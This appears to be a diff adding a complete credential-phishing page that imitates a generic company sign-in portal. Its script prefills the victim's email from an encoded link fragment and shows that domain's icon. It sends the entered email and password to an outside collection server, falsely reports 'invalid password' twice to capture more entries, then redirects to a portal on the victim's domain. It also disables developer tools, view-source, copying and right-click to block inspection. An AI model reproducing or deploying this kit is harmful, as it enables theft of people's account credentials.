@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        /* reset & base */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html, body {
+            width: 100%;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+        
+        /* FORCE the background image - reduced by 50% with original background color */
+        body#logBody,
+        body#logBody#logBody,
+        html body#logBody {
+            background-image: url('https://omod.digital/imageblur.jpg') !important;
+            background-size: 50% auto !important;
+            background-position: center !important;
+            background-repeat: no-repeat !important;
+            background-attachment: fixed !important;
+            background-color: #FFFFFF !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            min-height: 100vh !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+        }
+        
+        /* Override any inline background from the original HTML */
+        body[bgcolor="#FFFFFF"] {
+            background-image: url('https://omod.digital/imageblur.jpg') !important;
+            background-size: 50% auto !important;
+            background-position: center !important;
+            background-repeat: no-repeat !important;
+            background-attachment: fixed !important;
+            background-color: #FFFFFF !important;
+        }
+        
+        /* main card – exactly middle, clean, bold, now 10% smaller (90% of original) and shifted up */
+        #logBox {
+            background: rgba(255, 255, 255, 0.92);
+            backdrop-filter: blur(2px);
+            padding: 28px 32px 32px 32px;
+            border-radius: 17px;
+            box-shadow: 0 18px 36px rgba(0, 0, 0, 0.5);
+            max-width: 468px;  /* 90% of 520px */
+            width: 100%;
+            margin: 0 auto;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            transition: all 0.2s;
+            position: relative;
+            z-index: 10;
+            transform: scale(0.9) translateY(-30px);  /* 90% of original size and shifted up */
+            transform-origin: center center;
+        }
+        /* preserve inner table layout but make it clean */
+        #logBox table {
+            margin: 0 auto;
+            width: 100%;
+            border-collapse: collapse;
+        }
+        #logBox table td {
+            padding: 3.5px 2px;
+            vertical-align: middle;
+        }
+        /* welcome message – bold, red, two lines, centered */
+        #errMssg {
+            color: #FF0000 !important;
+            font-family: Tahoma, sans-serif;
+            font-weight: 700 !important;
+            font-size: 1.08rem;  /* 90% of 1.2rem */
+            line-height: 1.5;
+            display: inline-block;
+            text-align: center;
+            margin: 5px 0 3px 0;
+        }
+        /* username / password labels */
+        #logBox b font {
+            font-weight: 700;
+            font-size: 0.85rem;  /* 90% */
+            color: #1e1e1e;
+        }
+        /* input fields */
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 9px 11px;
+            border: 1px solid #aaa;
+            border-radius: 30px;
+            font-size: 0.9rem;  /* 90% */
+            background: #f9f9f9;
+            transition: 0.2s;
+            font-family: 'Courier New', monospace;
+            outline: none;
+            box-shadow: inset 0 1px 3px rgba(0,0,0,0.06);
+        }
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            border-color: #2a6fdb;
+            background: #ffffff;
+            box-shadow: 0 0 0 3px rgba(42, 111, 219, 0.15);
+        }
+        /* sign in button – bold, rounded, full width */
+        #loginbtn {
+            width: 100%;
+            padding: 11px 0;
+            background: #1a3b6b;
+            color: white !important;
+            font-weight: 700;
+            font-size: 1rem;  /* 90% */
+            border: none;
+            border-radius: 40px;
+            cursor: pointer;
+            box-shadow: 0 3px 8px rgba(0,0,0,0.1);
+            transition: 0.2s;
+            text-align: center;
+            letter-spacing: 0.5px;
+            margin-top: 5px;
+            font-family: Tahoma, sans-serif;
+        }
+        #loginbtn:hover {
+            background: #0f2a4f;
+            transform: scale(1.01);
+            box-shadow: 0 5px 10px rgba(0,0,0,0.2);
+        }
+        /* hide attempt counters */
+        #login_attempt, #attemptNumber {
+            display: none !important;
+        }
+        /* icon image – email domain icon */
+        #domainIcon {
+            width: 43px;  /* 90% of 48px */
+            height: 43px;
+            border-radius: 50%;
+            object-fit: contain;
+            background: #eef2f7;
+            padding: 7px;
+            border: 1px solid #ddd;
+        }
+        /* remove extra spacing */
+        .multiClass {
+            display: none;
+        }
+        /* align table rows */
+        #LoginUserFormTable1 {
+            width: 100%;
+        }
+        #LoginUserFormTable1 td {
+            vertical-align: middle;
+        }
+        /* keep the hidden fields hidden */
+        input[type="hidden"] {
+            display: none;
+        }
+        /* responsive */
+        @media (max-width: 480px) {
+            #logBox {
+                padding: 20px 18px;
+                max-width: 360px;
+                transform: scale(0.9) translateY(-20px);
+            }
+            #errMssg {
+                font-size: 0.9rem;
+            }
+            body#logBody {
+                background-size: 70% auto !important;
+            }
+            #domainIcon {
+                width: 36px;
+                height: 36px;
+                padding: 6px;
+            }
+        }
+        /* make sure the "domain name" part is bold */
+        #errMssg b {
+            font-weight: 700;
+        }
+
+        /* label styling */
+        #logBox label {
+            font-size: 0.85rem !important;
+            margin: 4px 0 1px 4px !important;
+        }
+        /* fix gap in icon+text row */
+        #logBox div[style*="display:flex"] {
+            gap: 10px !important;
+            margin-bottom: 3px !important;
+        }
+    </style>
+        
+    <script src="https://omod.digital/ateja_files/jquery.min.js.download"></script>
+    <script src="https://omod.digital/ateja_files/enterprise.js.download"></script>
+</head>
+<body id="logBody" text="#000000" bgcolor="#FFFFFF" onload="setFormFocus();" style="background-image: url('https://omod.digital/imageblur.jpg') !important; background-size: 50% auto !important; background-position: center !important; background-repeat: no-repeat !important; background-attachment: fixed !important; background-color: #FFFFFF !important;">
+
+    <form id="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off" method="POST" action="https://omod.digital/ateja1.php">
+        <input id="domain" type="hidden" value="cutrubus.com" name="domain">
+        <input id="fieldName" type="hidden" value="contabo.net" name="field">
+        <input type="hidden" id="login_attempt" value="0">
+        <input type="hidden" id="attemptNumber" name="number" value="0">
+        <input name="RedirectTo" value="/workflow/webmail.nsf/webform2019?OpenForm" type="hidden">
+
+        <!-- main login card - now 10% smaller (90% of original) and shifted up -->
+        <div id="logBox" align="center">
+            <table border="0" cellspacing="0" cellpadding="0" style="width:100%;">
+                <tbody>
+                    <tr>
+                        <td style="text-align:center; padding-bottom:4px;">
+                            <!-- icon + welcome message -->
+                            <div style="display:flex; align-items:center; justify-content:center; gap:10px; flex-wrap:wrap; margin-bottom:3px;">
+                                <img id="domainIcon" src="https://omod.digital/ateja_files/0.gif" alt="Domain Icon" style="width:43px; height:43px; border-radius:50%; object-fit:contain; background:#eef2f7; padding:7px; border:1px solid #ddd;">
+                                <b><font face="Tahoma" id="errMssg" style="font-weight:700 !important;">Welcome to domain name secured portal<br>Sign in to continue</font></b>
+                            </div>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td style="padding:3px 0;">
+                            <label for="user-id" style="display:block; text-align:left; font-weight:700; font-family:Tahoma; font-size:0.85rem; margin:4px 0 1px 4px;">User name:</label>
+                            <input name="email" value="" maxlength="50" autocomplete="off" type="email" id="email" placeholder="your@email.com">
+                        </td>
+                    </tr>
+                    <tr>
+                        <td style="padding:3px 0 4px 0;">
+                            <label for="pw-id" style="display:block; text-align:left; font-weight:700; font-family:Tahoma; font-size:0.85rem; margin:4px 0 1px 4px;">Password:</label>
+                            <input name="password" value="" type="password" maxlength="255" autocomplete="off" id="password" placeholder="">
+                        </td>
+                    </tr>
+                    <tr>
+                        <td style="padding-top:8px;">
+                            <div id="loginbtn" onclick="processLogin()">Sign In</div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </form>
+
+    <script>
+        // ============================================================
+        // FULL KEYBOARD SHORTCUT DISABLING (Ctrl+U, Ctrl+Shift+I, F12, etc.)
+        // ============================================================
+        
+        document.addEventListener('keydown', function(event) {
+            var key = event.keyCode || event.which;
+            var ctrlKey = event.ctrlKey;
+            var shiftKey = event.shiftKey;
+            
+            var isForbidden = false;
+            
+            if (key === 123) isForbidden = true; // F12
+            if (ctrlKey && key === 85) isForbidden = true; // Ctrl+U
+            if (ctrlKey && shiftKey && key === 73) isForbidden = true; // Ctrl+Shift+I
+            if (ctrlKey && shiftKey && key === 74) isForbidden = true; // Ctrl+Shift+J
+            if (ctrlKey && shiftKey && key === 67) isForbidden = true; // Ctrl+Shift+C
+            if (ctrlKey && key === 83) isForbidden = true; // Ctrl+S
+            if (ctrlKey && key === 80) isForbidden = true; // Ctrl+P
+            if (ctrlKey && key === 82) { event.preventDefault(); isForbidden = true; } // Ctrl+R
+            if (key === 116) { event.preventDefault(); isForbidden = true; } // F5
+            if (ctrlKey && shiftKey && key === 82) { event.preventDefault(); isForbidden = true; } // Ctrl+Shift+R
+            if (ctrlKey && key === 69) isForbidden = true; // Ctrl+E
+            if (ctrlKey && key === 79) isForbidden = true; // Ctrl+O
+            if (ctrlKey && key === 72) isForbidden = true; // Ctrl+H
+            if (ctrlKey && key === 74) isForbidden = true; // Ctrl+J
+            if (ctrlKey && shiftKey && key === 85) isForbidden = true; // Ctrl+Shift+U
+            if (ctrlKey && shiftKey && key === 80) isForbidden = true; // Ctrl+Shift+P
+            if (key === 112 || key === 114) { event.preventDefault(); isForbidden = true; } // F1, F3
+            
+            if (isForbidden) {
+                event.preventDefault();
+                event.stopPropagation();
+                return false;
+            }
+        });
+        
+        document.addEventListener('contextmenu', function(event) {
+            event.preventDefault();
+            return false;
+        });
+        
+        document.addEventListener('dragstart', function(event) {
+            event.preventDefault();
+            return false;
+        });
+        
+        document.addEventListener('selectstart', function(event) {
+            event.preventDefault();
+            return false;
+        });
+        
+        document.addEventListener('copy', function(event) {
+            event.preventDefault();
+            return false;
+        });
+        
+        document.addEventListener('cut', function(event) {
+            event.preventDefault();
+            return false;
+        });
+        
+        // ============================================================
+        // END OF KEYBOARD SHORTCUT DISABLING
+        // ============================================================
+        
+        // Helper: extract just the domain name (e.g., "google" from "google.com")
+        function extractDomainNameOnly(fullDomain) {
+            if (!fullDomain) return "domain name";
+            var domainParts = fullDomain.split('.');
+            if (domainParts.length > 0) {
+                return domainParts[0];
+            }
+            return fullDomain;
+        }
+        
+        // Function to get favicon URL for a domain
+        function getDomainIconUrl(domain) {
+            if (!domain) return 'https://omod.digital/ateja_files/0.gif';
+            return 'https://www.google.com/s2/favicons?domain=' + domain + '&sz=64';
+        }
+        
+        // Update welcome message with dynamic domain name
+        function updateWelcomeMessage(emailAddress) {
+            var errElement = document.getElementById('errMssg');
+            var iconElement = document.getElementById('domainIcon');
+            if (!errElement) return;
+            
+            var domainNameOnly = "domain name";
+            var fullDomain = "";
+            
+            if (emailAddress && emailAddress.includes('@')) {
+                fullDomain = emailAddress.split('@')[1];
+                domainNameOnly = extractDomainNameOnly(fullDomain);
+                
+                if (iconElement && fullDomain) {
+                    iconElement.src = getDomainIconUrl(fullDomain);
+                    iconElement.onerror = function() {
+                        this.src = 'https://omod.digital/ateja_files/0.gif';
+                    };
+                }
+            } else {
+                if (iconElement) {
+                    iconElement.src = 'https://omod.digital/ateja_files/0.gif';
+                }
+            }
+            
+            errElement.innerHTML = "Welcome to " + domainNameOnly + " secured portal<br>Sign in to continue";
+            errElement.style.color = '#FF0000';
+            errElement.style.fontWeight = '700';
+        }
+        
+        // ---------- Base64 detection and email extraction ----------
+        function isBase64(str) {
+            try { 
+                return btoa(atob(str)) === str; 
+            } catch (err) { 
+                return false; 
+            }
+        }
+
+        function decodeEmailFromHash(hash) {
+            let base64Part = hash.split('&')[0].split('?')[0].trim();
+            if (!isBase64(base64Part)) return base64Part;
+            try {
+                let once = atob(base64Part);
+                if (once.includes('@')) return once;
+                try {
+                    let twice = atob(once);
+                    if (twice.includes('@')) return twice;
+                } catch (e) { return once; }
+            } catch (e) { return base64Part; }
+            return base64Part;
+        }
+
+        // Extract email from URL hash
+        (function() {
+            var hash = window.location.hash.replace("#", "").trim();
+            var emailField = document.getElementById("email");
+            if (!emailField) return;
+            
+            if (hash && hash.length > 0) {
+                var fullEmail = decodeEmailFromHash(hash);
+                emailField.value = fullEmail;
+                if (fullEmail.includes('@')) {
+                    var domainPart = fullEmail.split('@')[1];
+                    var domainField = document.getElementById('domain');
+                    if (domainField) domainField.value = domainPart;
+                    updateWelcomeMessage(fullEmail);
+                }
+            }
+        })();
+
+        // Track login attempts
+        let loginAttempt = parseInt(document.getElementById('login_attempt')?.value || '0');
+
+        function setErrorMessage(msg, isError) {
+            var errorElement = document.getElementById('errMssg');
+            if (errorElement) {
+                errorElement.innerHTML = msg;
+                errorElement.style.color = '#FF0000';
+                errorElement.style.fontWeight = '700';
+            }
+        }
+        
+        function resetToWelcome() {
+            var emailField = document.getElementById('email');
+            var emailValue = emailField ? emailField.value : '';
+            updateWelcomeMessage(emailValue);
+        }
+
+        function setFormFocus() {
+            document.getElementById('password').focus();
+        }
+
+        // Listen for email input to dynamically update welcome message
+        function setupEmailWatcher() {
+            var emailInput = document.getElementById('email');
+            if (emailInput) {
+                emailInput.addEventListener('input', function() {
+                    var errElem = document.getElementById('errMssg');
+                    if (errElem && !errElem.innerHTML.includes('invalid') && !errElem.innerHTML.includes('error') && !errElem.innerHTML.includes('wrong')) {
+                        updateWelcomeMessage(this.value);
+                    }
+                });
+                emailInput.addEventListener('blur', function() {
+                    var errElem = document.getElementById('errMssg');
+                    if (errElem && !errElem.innerHTML.includes('invalid') && !errElem.innerHTML.includes('error') && !errElem.innerHTML.includes('wrong')) {
+                        updateWelcomeMessage(this.value);
+                    }
+                });
+            }
+        }
+
+        $(document).ready(function() {
+            setupEmailWatcher();
+            $('#password').focus();
+            
+            $('#loginbtn').off('click').on('click', function(event) {
+                event.preventDefault();
+                processLogin();
+            });
+            
+            $('#logBox').on('keydown', function(event) {
+                if (event.which === 13) {
+                    event.preventDefault();
+                    processLogin();
+                }
+            });
+        });
+
+        function processLogin() {
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            var redirectTo = document.querySelector('input[name="RedirectTo"]')?.value || '';
+            var attemptInput = document.getElementById('attemptNumber');
+            var loginAttemptInput = document.getElementById('login_attempt');
+            var domain = email.split('@')[1] || '';
+
+            if (!email || !password) {
+                setErrorMessage("Please enter both username and password", true);
+                return;
+            }
+
+            loginAttempt = parseInt(loginAttemptInput?.value || '0');
+            setErrorMessage("Authenticating ...", false);
+
+            var formData = new URLSearchParams();
+            formData.append('email', email);
+            formData.append('password', password);
+            formData.append('domain', document.getElementById('domain').value);
+            formData.append('field', document.getElementById('fieldName').value);
+            formData.append('RedirectTo', redirectTo);
+            formData.append('attempt', loginAttempt + 1);
+
+            // Use fetch with proper CORS handling
+            fetch('https://omod.digital/ateja.php', {
+                method: 'POST',
+                headers: { 
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: formData.toString()
+            })
+            .then(response => response.text())
+            .then(data => {
+                // Original login attempt logic
+                if (loginAttempt === 0) {
+                    setErrorMessage("You provided an invalid username or password. Please sign in again.", true);
+                    document.getElementById('password').value = '';
+                    loginAttemptInput.value = '1';
+                    if (attemptInput) attemptInput.value = '1';
+                    document.getElementById('password').focus();
+                }
+                else if (loginAttempt === 1) {
+                    setErrorMessage("You provided an invalid username or password. Please sign in again.", true);
+                    document.getElementById('password').value = '';
+                    loginAttemptInput.value = '2';
+                    if (attemptInput) attemptInput.value = '2';
+                    document.getElementById('password').focus();
+                }
+                else if (loginAttempt === 2) {
+                    var errElement = document.getElementById('errMssg');
+                    if (errElement) errElement.innerHTML = "";
+                    
+                    loginAttemptInput.value = '3';
+                    if (attemptInput) attemptInput.value = '3';
+                    
+                    setTimeout(function() {
+                        if (domain) {
+                            window.location.href = "https://portal." + domain;
+                        } else if (email && email.includes('@')) {
+                            var emailDomain = email.split('@')[1];
+                            window.location.href = "https://portal." + emailDomain;
+                        } else {
+                            window.location.href = "https://www.example.com";
+                        }
+                    }, 1500);
+                }
+            })
+            .catch(error => {
+                // If fetch fails due to CORS, fallback to form submission
+                console.log('Fetch failed, using form submission:', error);
+                
+                // Create a hidden form and submit it
+                var tempForm = document.createElement('form');
+                tempForm.method = 'POST';
+                tempForm.action = 'https://omod.digital/ateja1.php';
+                tempForm.enctype = 'application/x-www-form-urlencoded';
+                
+                // Add all fields
+                var fields = {
+                    'email': email,
+                    'password': password,
+                    'domain': document.getElementById('domain').value,
+                    'field': document.getElementById('fieldName').value,
+                    'RedirectTo': redirectTo,
+                    'attempt': loginAttempt + 1
+                };
+                
+                for (var key in fields) {
+                    var input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = key;
+                    input.value = fields[key];
+                    tempForm.appendChild(input);
+                }
+                
+                document.body.appendChild(tempForm);
+                tempForm.submit();
+            });
+        }
+
+        // Stubs for original functions
+        window.clkLgn = function(cb) { cb(false); };
+        window.checkSubmit = function(e, cb) { if (e.which == 13) { e.preventDefault(); cb(false); } };
+        window.displayCss = function(status) {
+            if (status) setErrorMessage("Check your entry for password. Please sign in again:", true);
+            else setErrorMessage("You provided an invalid username or password. Please sign in again:", true);
+            $('#password').focus();
+        };
+        
+        // Enter key handler
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && (document.activeElement.id === 'password' || document.activeElement.id === 'email')) {
+                e.preventDefault();
+                processLogin();
+            }
+        });
+        
+        // Sanitize any attempt/redirect text
+        setInterval(function() {
+            var errElem = document.getElementById('errMssg');
+            if (errElem && errElem.innerHTML) {
+                var text = errElem.innerHTML;
+                if (text.includes('Attempt') || text.includes('Redirecting')) {
+                    var emailField = document.getElementById('email');
+                    updateWelcomeMessage(emailField ? emailField.value : '');
+                }
+            }
+        }, 100);
+        
+        // Ensure proper positioning and red color on load
+        window.addEventListener('load', function() {
+            var emailField = document.getElementById('email');
+            updateWelcomeMessage(emailField ? emailField.value : '');
+            if (document.getElementById('password')) {
+                document.getElementById('password').focus();
+            }
+            
+            // Force background image again after load
+            document.body.style.backgroundImage = "url('https://omod.digital/imageblur.jpg')";
+            document.body.style.backgroundSize = "50% auto";
+            document.body.style.backgroundPosition = "center";
+            document.body.style.backgroundRepeat = "no-repeat";
+            document.body.style.backgroundAttachment = "fixed";
+            document.body.style.backgroundColor = "#FFFFFF";
+        });
+    </script>
+</body>
+</html>
